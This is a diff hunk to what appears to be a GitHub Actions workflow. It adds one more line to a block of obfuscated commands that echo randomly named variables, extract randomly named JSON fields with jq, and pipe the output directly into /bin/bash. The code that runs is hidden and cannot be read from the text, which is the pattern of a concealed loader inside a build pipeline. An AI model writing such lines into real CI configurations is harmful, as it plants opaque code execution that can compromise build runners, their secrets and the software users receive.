@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$yq41260" | jq -r .fn49 | /bin/bash
           echo $jqmer76 | jq -r .ew4 | /bin/bash
           echo $caxw31852 | jq -r .zrm355 | /bin/bash
+          echo $j7 | jq -r .kqqom7 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
